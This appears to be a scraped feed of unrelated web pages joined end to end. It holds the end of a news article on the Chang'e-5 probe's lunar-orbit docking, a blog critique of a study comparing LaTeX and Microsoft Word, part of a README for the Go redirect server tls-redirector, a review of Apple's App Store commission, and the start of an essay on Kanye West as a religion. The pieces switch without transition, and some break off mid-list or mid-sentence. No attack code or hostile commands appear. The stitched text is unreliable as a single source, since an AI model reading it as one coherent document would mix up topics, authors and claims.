operation.&nbsp;</p><p>The return capsule carrying the lunar materials weighing two kilograms separated from the orbital module in lunar orbit at 12:35 pm on Sunday, and now it is waiting for a suitable window to return to the Earth, CNSA said.&nbsp;</p><p>The docking maneuver was described by Chinese netizens as "a kiss from space," as thousands of stargazers watch every step of the probe's odyssey. Space fans have witnessed several major breakthroughs in China's aerospace history.&nbsp;</p><p>Sources close to the mission previously told the Global Times that the Chang'e-5 probe is set to achieve four firsts in China's aerospace history.&nbsp;</p><p>It has already achieved three of these, including the first-ever robotic sample collecting on lunar surface, a complex takeoff from the rough lunar terrain, and most challenging of all, the rendezvous and docking in lunar orbit.&nbsp;</p><p>One of the most crucial devices applied during the spacecraft's docking maneuver was a pair of microwave radars, installed on both the ascender and the orbiter, which helps measure and adjust the positions of the two sections under fast-changing distances, and transmit data during the process.&nbsp;</p><p>This technology has been applied previously to multiple rendezvous and docking operations in low Earth orbit, including the crewed Shenzhou mission.&nbsp;</p><p>However, it is the first time the technology has been tried in lunar orbit 380,000 kilometers from the Earth, with the maneuver becoming a world-leading innovation in the aerospace field.&nbsp;</p><p>"Compared with low-Earth orbit, satellite services can't be used for navigation in lunar orbit. The only means of communication is through microwave radar," said Sun Wu, chief engineer of the technology. "The lunar orbit has a more complicated environment, placing some extremely harsh requirements for the probe to overcome the influences from space, such as lunar gravity."</p><p>The chief designer of the docking operation described the microwave radar as eyes that can "see thousands of miles," and ears that can "hear sounds from afar," which will ensure the Chang'e-5 probe's smooth return.&nbsp;&nbsp;</p><p>Another cutting-edge technology is a grabbing machine used to transfer the samples in lunar orbit, resembling the action of a person holding sticks. This technology is also a world's first that ensured the safe handover of the valuable package in space.&nbsp;</p><p>"The distance from the Earth to the moon means a time delay, so there's only a short time window for the maneuver. It means a highly efficient docking process in just 21 seconds," Sun said.&nbsp;&nbsp;</p><p>Chinese researchers started working on simulations in 2011, conducting 661 docking tests and 518 sample transfer tests.&nbsp;</p><p>The rendezvous and docking could be of great value to other deep-space or even manned missions in the future, the significance of which would be no less than the Apollo missions, once the calling card of human lunar exploration activities during the Cold War, Chinese analysts said.</p><p>"It has become a milestone for China's aerospace development," Song Zhongping, an aerospace expert and TV commentator, said, calling it "a visionary practice that lays a technological foundation for future deep-space explorations."</p><p>It also verifies the viability of manned lunar landing missions, and even the construction of a lunar research base, or Mars missions, he told the Global Times.&nbsp;</p><p>Andrew Jones, a Finland-based journalist for space.com, a premier source of space exploration information around the world, tweeted his congratulations to China,&nbsp; saying that the rendezvous and docking between the ascent vehicle and the orbiter is a "massive step toward bringing home fresh lunar samples."</p><p>China's final breakthrough is the return trajectory, with the capsule traveling at the speed of 11 kilometers per second, reaching second cosmic velocity.&nbsp;</p><p>Sources told the Global Times that designers with the China Academy of Space Technology under CASC have designed a semi-ballistic reentry to help the high-speed spacecraft return to the Earth safely.</p><p>Similar to the way a stone can skip over water, the return capsule will sprint into the atmosphere and then ascend again out of it, in order to reduce its speed to first cosmic velocity, which is around 8 kilometers per second, before landing safely at its&nbsp; designated site.&nbsp;</p><p>Wang Ya'nan, chief editor of Aerospace Knowledge magazine, told the Global Times that this measure will greatly reduce the risk of damaging the return capsule and will ensure the sample's safety.</p><p>He added that the highly complex, forward-looking technology applied in this project could be regarded as "an unmanned task that lays the foundation for future manned lunar missions."</p><p>The reentry capsule will carry the lunar sample and is scheduled to land in North China's Inner Mongolia Autonomous Region in mid-December.&nbsp;</p><p><strong>Newspaper headline: Chang'e-5 docks in lunar orbit</strong></p> </div>

<p>
The boss needed item 3 inserted into a numbered list of hundreds of items.
The intern used a mouse to select the original 3 on the screen,
then typed 4,
then selected the original 4,
then typed 5,
then scrolled down,
then selected the original 5,
then typed 6,
and so on.
Another intern sat watching the screen to make sure there were no mistakes.
</p>
<p>
I happened to be in the room for other reasons.
I remember the horror of watching the beginning of this barbaric editing process.
Those poor interns!
</p>
<p>
When I enter a list of items into the computer,
what I'm typing doesn't look like
</p>
<pre>     1. ...
     2. ...
     3. ...
</pre>
<p>
but more like
</p>
<pre>     * ...
     * ...
     * ...
</pre>
<p>
Each asterisk is a special command to the computer,
telling the computer to automatically display the next number for the reader.
The reader eventually sees
</p>
<pre>     1. ...
     2. ...
     3. ...
</pre>
<p>
but that isn't what I typed.
This small difference produces a tremendous savings of time
whenever I insert an item, or delete an item, or move an item.
</p>
<p>
If I decide later
to skip the numbers
and use bullets instead,
I tell the computer
to introduce each list item with a bullet.
This is one command covering the whole list.
There's also a command that does the same thing
for the whole document.
There isn't separate work for each item.
It's no problem if a coauthor
later wants to change bullets back to numbers.
</p>
<p>
The interns, I suppose,
would be manually changing "1." and "2." and "3."
and so on to "•" and "•" and "•" and so on.
Or maybe they would be trying to figure out
how some search-and-replace feature could do the same thing;
let's hope the document doesn't have a sentence somewhere
that talks about something that happened in the year 2001.
Or maybe the interns would be quitting and finding a better job.
</p>
<p>
[Note added 2020.12.07:
I was expecting that many of my readers
would already be accustomed to relying on the computer
for automatic numbering.
I was surprised, however,
to see some comments along the lines of "Inconceivable!"
from readers unable to imagine
how the interns could have been in a different situation,
going through such a shockingly inefficient revision process.
Here's a hint:
Each item in the list looked like a flush-left paragraph,
like the paragraphs in this blog post,
adjacent to the left margin.
The text being selected by the mouse,
for example to change "3" to "4",
was to the right of the margin,
like the rest of the text in each item.]
</p>
<p>
<b>Abstraction as a time-saver for authors.</b>
This use of asterisks
is just one example of how I'm often typing something more abstract
than what's seen by the ultimate reader.
I don't type "Figure 12" or "see [41]", for example;
I type things like "Figure \ref{network-measurements}" and "see \cite{multiplication-survey}",
and I let the computer automatically convert
"\ref{network-measurements}" and "\cite{multiplication-survey}"
into numbers to display for the reader.
</p>
<p>
With one extra command,
covering the entire document,
I can tell the computer
to include section numbers
as part of all figure numbers in the document,
so that the figures are easier for the reader to find:
e.g., Figures 3.1 and 3.2 and 3.3 are in Section 3.
With another command,
again covering the entire document,
I can tell the computer
to cite all authors by name rather than by number.
</p>
<p>
As another example,
I was recently editing a mathematical paper,
and I decided that a particular concept
would be easier for the reader to remember
if I changed the notation that I was using for the concept.
The notation was all over the paper,
but this change took just a few seconds of editing.
I had given a name to the concept,
had told the computer <i>once</i> to display this name as a particular notation,
and had then typed this name throughout the paper,
so there was only one place where I had to change the notation.
</p>
<p>
Of course one can't,
and shouldn't try to,
prepare in advance for <i>every</i> possible change to a document.
But it's not hard to prepare for the most likely changes.
This small initial effort
saves a tremendous amount of time later.
When I say "small",
I'm including the effort to select a document-creation system
that's designed to
<a href="https://en.wikipedia.org/wiki/LaTeX">make this sort of thing easy</a>.
</p>
<p>
(As a side note,
programmers will recognize this strategy
as an example of the
<a href="https://en.wikipedia.org/wiki/Information%5Fhiding">information hiding</a>
strategy introduced by Parnas,
and will recognize that modern program-creation systems
are designed to make this easy.)
</p>
<p>
Microsoft Word isn't completely missing abstractions,
but these abstractions
are competing for user-interface resources
against features encouraging the user
to work at lower abstraction layers.
The extra effort to use the abstractions
ends up pushing users into doing something simpler,
something that just works now,
and paying heavily for this choice
later when the document is being revised.
</p>
<p>
Have I done a scientific study
<i>proving</i> that Microsoft Word
is less efficient than LaTeX?
No.
I'd love to see a careful study of this topic.
Short-term,
this would help guide new authors to make sensible choices.
Longer-term,
insights from this sort of study could be the basis for further improving
our document-creation systems.
I certainly don't think that the existing systems are perfect.
(<a href="https://cr.yp.to/writing/visual.html">Example.</a>)
</p>
<p>
Imagine, however, that a study looks only at
<i>the time for someone looking at a printout to create a document matching this printout</i>.
This would be blind to the time for subsequent edits.
This would be blind to the suffering of those interns.
This would incorrectly conclude that typing
"1. ... 2. ... 3. ..." and "see [41]"
is more efficient than typing
"* ... * ... * ..." and "see \cite{multiplication-survey}".
It <i>is</i> slightly more efficient in this limited metric,
but it is much less efficient in the metric that matters,
namely the total time spent by the user.
</p>
<p>
<b>An example of a "scientific" study.</b>
At this point you're probably thinking that
nobody could possibly miss such an obvious issue.
This brings me to the main topic of this blog post,
a 2014 peer-reviewed study
<a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0115069">"An Efficiency Comparison of Document Preparation Systems Used in Academic Research and Development"</a>
by two psychologists,
Knauff and Nejasmic ("KN").
</p>
<p>
Participants in the study were given a page of text
and were given a limited time to type the page into the computer.
There were three different types of text:
</p>
<ul>
<li>simple prose with a few footnotes;
</li>
<li>a page with a complicated table of data;
and
</li>
<li>a page with many mathematical formulas.
</li>
</ul>
<p>
Participants were scored
on the basis of how much text they typed and how accurately they typed it.
The time was so rushed that a significant fraction of participants
didn't finish typing the whole page,
even for the case of simple prose.
</p>
<p>
The study considered two document-creation systems:
LaTeX and Microsoft Word,
in each case with "all tools, editors, plug-ins, and add-ons"
that participants were "accustomed to using".
Of course different "add-ons" could have different efficiency,
and of course there are other document-creation systems,
but these are topics for another blog post.
</p>
<p>
The study produced many pages of results,
which I'll summarize by saying that
Word did slightly better on the prose
and much better on the table,
while LaTeX did better on the formulas.
The study authors made no effort to measure any subsequent document-editing step.
</p>
<p>
<b>Slithering from one metric to another.</b>
The fundamental mistake in the KN paper
is the change of cost metric.
</p>
<p>
The original question was how efficiently authors are creating documents:
in particular, how efficiently authors are creating academic research papers.
KN claimed in their title to be comparing "efficiency"
of "document preparation systems used in academic research".
But they then quietly changed this metric in three ways:
</p>
<ul>
<li>
They considered only the efficiency of an initial fragment of the document-creation process,
ignoring the time spent revising documents.
They provided no reason to believe that the efficiency of this fragment
was well correlated with what they had previously claimed to be measuring.
Nothing in their paper acknowledges
the most obvious reason for a negative correlation,
namely that slightly more work at the outset
makes revisions much easier later.
In my experience,
document-creation systems vary in how well they support this work.
</li>
<li>
KN didn't even measure the time taken for this initial fragment of the process.
Instead they imposed a rushed time limit,
and measured how incomplete and inaccurate the resulting document was.
Again they provided no reason to believe that what they measured
was well correlated with what they had previously claimed to be measuring.
Perhaps they were assuming that more mistakes will take more time to fix,
but my experience is that some types of mistakes are much easier to fix than others,
and that document-creation systems vary in the types of mistakes they encourage.
</li>
<li>
KN didn't even measure creating a <i>new</i> document,
which is what academics are actually spending their time doing.
People who were writing papers in the age of typewriters
will remember writing and editing papers <i>by hand</i>
before tediously typing the final pages,
but that was because editing a typed page
ranged from annoying
(<a href="https://en.wikipedia.org/wiki/Correction%5Ffluid">white-out</a>,
or sometimes scissors and tape)
to super-annoying
(retyping the whole page).
Today the initial writing on paper is skipped,
and typing is interleaved in small chunks
with parts of the author's thought process,
making the typing process much less boring.
I'm continually re-reading
and thinking about what I just typed.
Is the error rate of the academic's modern typing process
well correlated with the error rate of the
archaic retyping process that KN measured?
Again KN provide no reason to believe this.
</li>
</ul>
<p>
Did KN use the honest title
"A comparison of the unreliability of
rushed retyping of a page
using document preparation systems
that are also used for academic research and development"?
No.
Would you expect a journal to accept a paper
with such a title?
</p>
<p>
Instead they used a title …</p></div>

<p>tls-redirector is a tiny HTTP server written in Go that is designed to run on
port 80 and redirect all incoming traffic to HTTPS. It does this by emitting a
301 Permanent Redirect where the scheme is simply replaced with "https".</p>
<p>This is intended to separate out responsibilities from the software that
listens on port 443 and serves your website. Because you have tls-redirector
on port 80, you do not need to configure HTTP to HTTPS redirects; simplifying
configuration for Apache, nginx, or whatever web server you use.</p>
<p>Furthermore, most crawlers and bots will actually connect to port 80 without a
meaningful Host header. As tls-redirector cannot be configured, it can only
politely tell them to go away, whereas your primary web server likely sends
them to the "default server" which may well redirect them to your website,
opening you up to being scanned. This causes tons of noise in your log files.</p>
<p>Because it uses the Host header, tls-redirector is truly zero-config. Set it
up once and forget about it.</p>

<p>The <code>Host</code> header is required to redirect - there's no way to configure a
default - and visitors without one will simply see an error message.</p>
</li>
<li>
<p>Only a single ACME challenge directory can be served, as the <code>Host</code> header
is ignored, so if you have multiple domains or servers on the same machine,
you may want to:</p>
<ul>
<li>Consider using DNS based ACME challenges.</li>
<li>Store all your HTTP based ACME challenges in the same directory.</li>
</ul>
</li>
</ul>
<h3 id="configuration"><a href="#configuration" rel="nofollow noopener">#</a>Configuration</h3>
<p>Behavior may be configured through the following environmental variables:</p>
<ul>
<li>
<p><code>PORT</code>. TCP/IP port number to listen on. If not specified, port 80 is used
OR systemd socket activation is detected and used.</p>
<p>You can force tls-redirector to use socket activation with <code>PORT=systemd</code>.</p>
</li>
<li>
<p><code>ACME_CHALLENGE_DIR</code> Path to a directory on disk to serve at the
path <code>/.well-known/acme-challenge</code>. All files are served as <code>text/plain</code> and
is intended to provide support for HTTP based ACME challenges if necessary.</p>
<p>Setting this to <code>/tmp</code> means tls-redirector will look for files in that
directory. This differs slightly from the <code>--webroot</code> command of EFF certbot
because certbot expects to be at the root, and tls-redirector does not.
Therefore, when you setup certbot, if you have the following:</p>
<p><code>certbot --webroot /var/www</code></p>
<p>You should set TLS Redirector to:</p>
<p><code>ACME_CHALLENGE_DIR=/var/www/.well-known/acme-challenge</code></p>
</li>
</ul>

December 6, 2020 | https://insightbrowser.com/blog/developers-vs-apple-30-percent-tax-review | <a href="https://web.archive.org/web/*/https://insightbrowser.com/blog/developers-vs-apple-30-percent-tax-review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p>I'm about to write an essay about how I think Apple could make their 30% cut on App Store sales very worth it to developers, but I thought it was worth doing a quick, dense review first on the history and contentiousness of this "tax".</p><h3>Why 30%?</h3><ul><li>"There was some precedent; Apple <strong>had been charging roughly the same commission on music sales</strong> on its iTunes software. For each 99 cent song it sold, Apple passed on 72 cents to major music labels and 62 cents to independent labels, according to The Wall Street Journal in 2007."</li><li>When Apple began setting rules for the App Store, “30 percent was just kind of a no-brainer,” said Mr. Shoemaker, who joined the company in early 2009. “It was, ‘Of course that’s what we’re going to use.’ Nobody questioned it.”</li></ul><p>Both from this <a href="https://www.nytimes.com/2020/08/14/technology/apple-app-store-epic-games-fortnite.html">NYT piece</a>.</p><h3>What does it cost Apple?</h3><ul><li>Apple charges a 30% cut of app sales and in-app purchases to developers and now 15% to developers making under $1m annually (small devs make for 5% of overall revenue). <a href="https://www.theverge.com/2020/11/18/21572302/apple-app-store-small-business-program-commission-cut-15-percent-reduction">[source 1]</a> <a href="https://www.nytimes.com/2020/11/18/technology/apple-app-store-fee.html">[source 2]</a></li><li>Apple doesn't release the cost to operate the app store, but they essentially provide the <strong>same service for Mac for a fixed price of ~$100/year</strong> (which developers also pay for iOS). So it should be safe to assume that the fixed price covers it.</li></ul><h3>How much do they make from it?</h3><ul><li>Apple brings in $50 billion a year from app sales so this comes out to about $15b a year, which is a nontrivial <strong>~14.2% of their 2020 profit</strong> of $105b <a href="https://www.macrotrends.net/stocks/charts/AAPL/apple/gross-profit">[source]</a><a href="https://www.cnbc.com/2020/01/07/apple-app-store-had-estimated-gross-sales-of-50-billion-in-2019.html#:~:text=Apple's%20App%20Store%20platform%20grossed,Store%20alone%20would%20be%20no.">[source]</a></li></ul><h3>Why were developers ok with this in the first place?</h3><ul><li>It's unprecedented in software for developers to pay a % fees to the OS owners. Normally, OS owners have had to appease developers to build killer apps for their platforms.</li><li>But iPhone was so far ahead of the competition at launch in 2007 out of the box that <strong>it reversed the dynamic and developers wanted to be on the platform instead</strong>. Then, they got used to the 30% and Android followed suit because Android doesn't <em>directly</em> compete with iPhone (see below).</li></ul><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/sPyZIulyNnxjXdxx.png" alt="Screen-Shot-2018-08-16-at-11.00.12-AM-1024x534.png"></p><h3>Why can Apple still charge this much?</h3><ul><li>Apple is not technically a monopoly because consumers have the choice of Android. But <strong>Android and iOS users are very distinct demographics that don't switch</strong>, and Apple users are far more willing to pay money for apps.</li></ul><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/JoTarglFpKLOrCbW.png" alt="Untitled.png"></p><p><a href="https://www.neowin.net/news/despite-androids-massive-market-share-ios-still-makes-more-money-for-developers/"></a>Source: <a href="https://www.neowin.net/news/despite-androids-massive-market-share-ios-still-makes-more-money-for-developers/">Neowin</a></p><ul><li>Android has far more users but they pay a lot less, while Apple has a low fewer users but they pay a lot more, resulting in overall revenues being about even.</li></ul><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/uoeFazIlqcKIzUkh.png" alt="Untitled (1).png"></p><p><a href="https://stratechery.com/2019/beachheads-and-obstacles/"></a>Source: <a href="https://stratechery.com/2019/beachheads-and-obstacles/">Stratechery</a></p><h3>Does Google (or anyone else) have incentive to lower their cut and compete?</h3><ul><li>Not really, let's say developers save money and pass them on to their Android customers, customers have already demonstrated willingness to pay more than a (100/70 = 1.42x) premium for Apple's products, mostly due to their tight integration with other Apple hardware and focus on privacy.</li><li>We've already seen competing app platforms like Windows Phone fail. Apps are very long-tailed in their usage and the long tail of developers don't have resources to build for yet another platform (except perhaps the web).</li></ul><h3>Is the web viable competition to apps?</h3><ul><li>Not really for apps that solve <a href="https://insightbrowser.com/blog/open-web-dying-why-care"><em>familiar problems</em></a> —  the web can't do several important things that native apps can, e.g. notifications, bluetooth, NFC, etc. <a href="https://www.infoq.com/news/2020/07/apple-fingerprinting-privacy/">Some claim</a> that Apple and Google are deliberately crippling web browser standards to keep it this way because because they own iOS/Android and exert a lot of influence on W3C as owners of Safari and Chrome.</li><li>But increasingly, it can do more than you expect and some big companies stand to make/save a lot of money by delivering their apps through the web. Amazon is offering its cloud gaming service <a href="https://www.theverge.com/2020/9/25/21455343/amazon-luna-apple-app-store-rules-cloud-gaming-streaming-google-nvidia">on iOS through the browser</a>, and technically, it can work!
</li></ul><iframe width="560" height="315" src="https://www.youtube.com/embed/dNd_makcpHE" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><h3>Why are developers unhappy with it now?</h3><p>There's 2 different arguments</p><ul><li>Apple builds its own competitive apps and can always undercut them on prices by at least that 30%, e.g. <a href="https://www.timetoplayfair.com/">Apple Music vs. Spotify</a>.</li></ul><ul><li>The "it's not fair" argument. In particular, Fortnite <a href="https://www.zdnet.com/article/epic-lawsuit-vs-apples-30-app-store-cut-aims-for-leverage-pressure-and-a-better-deal/">flouted</a> this rule and offered discounts to users paying them directly and Apple took them off the App Store. Fortnite is a beloved and popular game so this generated lots of public sentiment against Apple.</li></ul><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/NRpDvTfoYxoQggBK.png" alt="epic-app-store (1).png"></p><ul><li>Apple terms don't let developers tell users that their prices are inflated because of this cut and that they can get the same service for cheaper. Facebook, for example, had to <a href="https://www.theverge.com/2020/8/28/21405140/apple-rejects-facebook-update-30-percent-cut">charge users more for attending real-life events</a> if they bought a ticket on an iPhone, though they now have a temporary relief.</li></ul><p><img src="https://landen.imgix.net/blog_uSsTzKptQlxlvUvQ/assets/klSCdbpBnYIaJDLw.jpg" alt="Eobp-R4UwAAUef_.jpeg"></p><p>The best summary I can offer is this <a href="https://emojipedia.org/index-pointing-up/">☝️</a> illustration, and another quote from the NYT <a href="https://www.nytimes.com/2020/08/14/technology/apple-app-store-epic-games-fortnite.html">piece</a>.</p><blockquote>“I think we’re realizing that 30 percent is way too much,” said Phillip Shoemaker, a former senior App Store executive, who left Apple in 2016. Credit card companies charge roughly 3 percent to process payments. “It should be closer to that,” he said.<a href="https://emojipedia.org/index-pointing-up/">
</a></blockquote><h3>Do developers have enough leverage to change Apple's mind?</h3><ul><li>Small developers (ones making under $1m ARR) don't financially but because they are a large number, they probably matter from a public sentiment point of view. They only make up for <a href="https://www.nytimes.com/2020/11/18/technology/apple-app-store-fee.html">5% of the revenue</a>. Apple also <a href="https://www.apple.com/newsroom/2020/11/apple-announces-app-store-small-business-program/">recently reduced</a> their take to 15% for small developers.</li><li>Big developers have mostly been OK playing by Apple's rules or making special deals, but that may change with new incentives and more regulation?</li></ul><h3>Who has special deals with Apple?</h3><ul><li><a href="https://www.theverge.com/2020/7/30/21348108/apple-amazon-prime-video-app-store-special-treatment-fee-subscriptions">Amazon has a reduced rate of 15% with Apple for Prime Video subscriptions</a>.</li><li><a href="https://variety.com/2020/digital/news/apple-facebook-live-events-waives-30-percent-tax-gaming-1234783624/">Facebook temporarily isn't paying for live events.</a></li></ul><h3>What about ad revenue?</h3><ul><li>Notably, Apple does not take a cut of ad revenue made on apps running on iOS, thereby increasing the incentive to be a free app monetized by ads.</li></ul><h3>What big companies are likely to keep complaining?</h3><ul><li><a href="https://www.timetoplayfair.com/">Spotify, they directly struggle to compete with Apple Music</a>, and it'll likely get even harder with Apple's bundled Apple One.<a href="https://techcrunch.com/2018/12/31/netflix-stops-paying-the-apple-tax-on-its-853m-in-annual-ios-revenue/"></a> Apple has this <a href="https://www.apple.com/newsroom/2019/03/addressing-spotifys-claims/">response</a> to Spotify.</li><li>Amazon and Google now both own cloud gaming platforms that they would presumably want on iOS, and gaming accounts for 77% of app revenue right now, so there's lots of money at stake. <a href="https://www.businessofapps.com/data/app-revenues/">[source]</a></li><li><a href="https://techcrunch.com/2018/12/31/netflix-stops-paying-the-apple-tax-on-its-853m-in-annual-ios-revenue/">Netflix</a>, maybe. For now they don't allow signing up via the app. They've probably done the calculation that most users will be ok signing up with an untaxed platform, then logging in with iOS.</li></ul><h3>So, will Apple reduce its cut?</h3><ul><li>Unlikely unless it comes from regulatory pressure, which Apple is trying to mitigate with restructuring as a progressive tax with a 15% cut for small developers.</li><li>It'll be interesting to follow the development of cloud gaming and if that gets Amazon and Google to exercise more of their muscle.</li></ul><h3>How would the world change if Apple lowered their cut to 0%?</h3><ul><li>Apple would lose $15b in annual profit, around 14.2% of annual profit.</li><li>For reference, the only segment that makes more profit for Apple is likely iPhone hardware sales with sales of $55b and a margin of 60%, coming out to ~$33b. [<a href="https://www.investopedia.com/apple-s-5-most-profitable-lines-of-business-4684130#:~:text=For%20the%20fiscal%20year%202019,company%27s%20sales%3B%20the%20iPad%20accounted">source</a>] [<a href="https://www.phonearena.com/news/Profit-margins-on-the-iPhone-have-fallen-to-60_id111023">source</a>]</li><li>We'd see subscription services like Spotify, Netflix, Audible and Peloton becoming more competitively priced and easier to sign up for on iOS. Audible may stop doing their really weird credits scheme.</li><li>I suspect there won't be much of a change to the indie app ecosystem from going from 15% to 0, though some that have held out on principle may join in.</li></ul><h3>Clarifying out position</h3><ul><li>We plan for Insight to be a freemium product once its out of beta, so as an iOS browser this we'd naturally like to keep costs down.</li><li>We generally have a no-ads position and ad blocking is one of our users' favorite features. We don't want to cripple it to make sustainable revenue.</li><li>All things considered, it'd be easier to live without the 15%/30% cut, but for now we're willing to play with it.</li></ul><p>That's all I can think of for now. I'd like to keep this piece updated so feel free to reach out to me at <a href="https://twitter.com/abhinavsharma">@abhinavsharma</a> if there's something you'd like me to add that I've missed out on.</p></div></div></div></div>]]>

<p><strong>Who Is This For?</strong></p>
<ul><li><em>Artists and creative independents. </em>Kanye West’s most recent albums sound nothing like the one before. In an age of blockbusters and calculated risk, he proclaims <a href="https://www.hollywoodreporter.com/earshot/kanye-wests-yeezus-leaks-as-569315">his strategy is no strategy</a>. Yet he has also cultivated one of the most fervent fan bases, rivaling the Beyhive, Beliebers, and the Swifties. <em>Rolling Stone</em> and <em>Billboard</em> said he made the <a href="https://www.rollingstone.com/music/music-lists/best-albums-2010s-ranked-913997/kanye-west-my-beautiful-dark-twisted-fantasy-album-917419/">best recording album of the 2010s</a>. Love him or hate him, there’s something to learn.</li><li><em>Leaders. </em>Kanye took his fanbase, his investments into product, and his reputation, and figured out how to create and extract hundreds of million dollars worth of value from it. In an age where <a href="https://www.theatlantic.com/magazine/archive/2015/01/the-death-of-the-artist-and-the-birth-of-the-creative-entrepreneur/383497/">the artist has been declared dead</a>, Kanye transcends. Whether you’re an entrepreneur, a CEO, or a politician, you’ll get a lot from understanding his psychology and what convinces people—fans or collaborators—to buy into his thoughts.</li><li><em>Thinkers.</em> From popular culture to high fashion, and business to politics, Kanye West understands the world from a unique perspective and has taken the time to develop his own worldview. It’s important to discern the values behind what he talks about, because his words hold weight with a lot of people. It’s like how Kanye’s alma mater Nike talks about athletes. If you’re a human being, you’re a thinker—and you’re going to find this piece really interesting.</li></ul>
<p><em>See, I invented Kanye,</em><br><em>It wasn’t any Kanyes,</em><br><em>And now I look and look around,</em><br><em>And there’s so many Kanyes.</em><br><em>— I Love Kanye,” Kanye West, 2016</em></p>
<p><em>Kanye West is not Picasso</em><br><em>I am Picasso</em><br><em>Kanye West is not Edison</em><br><em>I am Edison</em><br><em>I am Tesla</em><br><em>Jay-Z is not the Dylan of anything</em><br><em>I am the Dylan of anything</em><br><em>I am the Kanye West of Kanye West</em><br><em>The Kanye West</em><br><em>Of the great bogus shift of bullshit culture</em><br><em>From one boutique to another</em><br><em>I am Tesla</em><br><em>I am his coil</em><br><em>The coil that made electricity soft as a bed</em><br><em>I am the Kanye West Kanye West thinks he is</em><br><em>When he shoves your ass off the stage</em><br><em>I am the real Kanye West</em><br><em>I don’t get around much anymore</em><br><em>I never have</em><br><em>I only come alive after a war</em><br><em>And we have not had it yet</em><br>— <a href="https://lithub.com/here-is-that-leonard-cohen-poem-about-kanye-west/">Leonard Cohen</a>, 2015</p>
<p>Like our own stories, we know how this one ends. But unlike our stories, anything that could happen <em>has</em> happened to Kanye West, and we have literally no idea what will happen next. Some of us have chosen to stop watching, but most of us don’t. Before the 21 Grammys, before <a href="https://www.rollingstone.com/music/music-lists/best-albums-2010s-ranked-913997/kanye-west-my-beautiful-dark-twisted-fantasy-album-917419/"><em>Rolling Stone</em></a> and <a href="https://thesource.com/2019/11/19/billboard-names-kanye-wests-my-beautiful-dark-twisted-fantasy-the-greatest-album-of-the-decade/"><em>Billboard</em></a>, before the Adidas and Gap deals that would make him a billionaire, only Kanye knew that he would be the greatest artist of our generation.</p>
<p>This is the first of a series covering the religion of Kanye West. I read <a href="https://thegeneralist.substack.com/p/modern-gospels">Mario Gabriele’s piece on Modern Gospels</a>, and I had to do it. Gabriele’s piece introduced me to sociologist <a href="https://iep.utm.edu/durkheim/#SH6c">Émile Durkheim</a>, who says a religion consists of three elements:&nbsp;</p>
<ul><li>“A unified system of beliefs and practices”—the values, practices, and beliefs that bind Kanye’s followers to his religion</li><li>“Sacred things, that is to say, things set apart and forbidden”—Kanye himself, his creative process, and his products (see the <a href="https://marker.medium.com/why-the-gap-is-betting-its-future-on-the-kanye-effect-c0a2b5d92b13?sk=5e1c5e392381b52b3b49f96d2ffe6f72">Kanye halo effect</a>)</li><li>“One single moral community called a Church”—the companies, communities, and individuals who have bought into Kanye West’s beliefs and practices</li></ul>
<p><em>Jargon alert: This piece will introduce Kanye West and cover one unified belief of the sacred object that ties the moral community together. I would love to do more parts that cover the other unified beliefs, as well as the Kanye West mythology and how he became a sacred object. I’d also like to write about the collective effervescence that sustains it (through concerts, products, and content), as well as the moral community (the Churches of Kanye). If you end up getting something from this article, consider buying my latest book, which was </em><a href="https://herbertlui.net/reps/"><em>written with the spirit of Kanye West’s creative process</em></a><em>.</em></p>
<p>Fervent celebrity worship is nothing new—for example, <a href="https://www.npr.org/2020/09/23/915846867/five-decades-on-an-eclectic-church-preaches-the-message-of-john-coltrane">the church of John Coltrane has stood for over five decades</a>. But even then, the case of Kanye West unlike any other. Love him or hate him, Kanye’s influence on today’s culture is undeniable. His admirers have ascended into powerful positions (e.g., Donald Glover has called himself <a href="https://djbooth.net/features/2016-06-20-donald-glover-kanyes-greatest-offspring">the son of Kanye</a>). Many of his collaborators have as well—the most prominent exhibit would be Virgil Abloh, who took the coveted menswear designer position at LVMH.</p>
<p>People worship Kanye the way they worship Elon Musk, Peter Thiel, Mark Zuckerberg, Oprah Winfrey, etc… Maybe even moreso, frankly. Some of these people carry the big bucks. Consider how Gap Inc., a Fortune 500 company, is betting on Kanye’s company, brand, and product insights to <a href="https://marker.medium.com/why-the-gap-is-betting-its-future-on-the-kanye-effect-c0a2b5d92b13?sk=5e1c5e392381b52b3b49f96d2ffe6f72">turn its core business around</a>.&nbsp;</p>
<p>Creating a religion is a simple feat the same way telling a story is a simple feat; it starts easy, but it’s actually really difficult. The hardest parts involve believing in yourself, getting people to care and believe you, and actually making the story come true.</p>
<p>This is an investigation into why people care about Kanye. Ever since <a href="https://www.highsnobiety.com/p/808s-and-heartbreak-influence/">he released <em>808s and Heartbreak</em></a>, people have considered Kanye’s career to be increasingly irrelevant. Yet, not only does he survive, he <em>thrives</em>. It’s not merely the controversy; otherwise, we would still be watching Charlie Sheen and Tekashi69. Why did you click into this article? Why do we care?</p>
<p>“I’m not a businessman, I’m a business, man!” Jay-Z rapped on “Diamonds (Remix)” with Kanye West. Kanye is no longer just a business or a brand—he has informally created a modern gospel that his fans can latch on to and incorporate into the world. Here’s what it looks like, and why it works.</p>
<p><em>Disclaimer: Kanye West as a person is different from his persona, I imagine, and I don’t know the guy personally. Like many in the Church of Kanye, I am only familiar with the persona—the one at the core of millions, if not billions, of parasocial relationships. Like Kanye says, I’m going to use that disadvantage as my advantage though.</em></p>
<p><em>I wrote this for </em><strong><em>entertainment</em></strong><em> value. Other people have written books about this topic, so feel free to look into them if you want a comprehensive, academic, view of Kanye West’s religion. For now, I see this as a foundational sketch—not a final painting—of his work. An introduction to ideas beyond the headlines, perhaps like a demo of a song, if you will…&nbsp;</em></p>
<h2>Kanye, the Free Thinker</h2>
<p>These past few years, we’ve heard Kanye West repeatedly compare himself to people like Steve Jobs, Walt Disney, Karl Lagerfeld, Howard Hughes, Michael Jackson, and such. These comparisons don’t hint at his intellectual background necessarily—they’re references for what Kanye wants people to see his possibilities as. <a href="https://www.interviewmagazine.com/music/kanye-west">He says</a>, “In no way do I want to be the next any one of them. But I am the first me. So I only mention those other names to try to give people a little bit of context.”&nbsp;</p>
